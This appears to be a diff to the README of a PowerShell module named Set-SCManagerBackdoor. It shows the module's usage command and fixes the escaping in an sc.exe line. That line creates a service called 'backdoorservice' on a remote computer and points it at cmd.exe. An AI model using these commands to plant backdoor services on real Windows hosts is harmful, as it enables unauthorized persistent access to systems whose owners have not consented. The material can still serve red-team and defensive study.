@@ -10,7 +10,7 @@ Import-Module Set-SCManagerBackdoor
 # Usage
 Set-SCManagerBackdoor -RemoteComputer "IP\remotecomp.domain.com" -Username "domain\myusername"
 
-sc.exe \\Remote-Computer create backdoorservice binpath= C:\Windows\system32\cmd.exe
+sc.exe \\\\Remote-Computer create backdoorservice binpath= C:\Windows\system32\cmd.exe
 
 # ToDo
 MayBe Add functionality add service as well with Delete privileges
